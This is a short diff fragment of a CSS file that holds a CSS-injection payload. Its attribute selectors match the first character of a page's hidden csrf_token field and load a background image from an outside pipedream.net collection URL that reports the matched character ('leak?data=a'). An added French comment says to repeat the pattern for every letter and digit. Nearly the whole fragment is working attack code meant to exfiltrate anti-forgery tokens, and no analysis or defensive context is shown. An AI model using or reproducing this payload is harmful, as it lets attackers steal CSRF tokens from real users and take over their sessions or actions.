@@ -8,7 +8,7 @@ input[name="csrf_token"][value^="b"] {
 input[name="csrf_token"][value^="a"] {
     background: url("https://eonrhva8rc2vvk2.m.pipedream.net/leak?data=a");
 }
-
 input[name="csrf_token"][value^="b"] {
     background: url("https://eonrhva8rc2vvk2.m.pipedream.net/leak?data=b");
 }
+/* Répète ce schéma pour toutes les lettres et chiffres possibles */
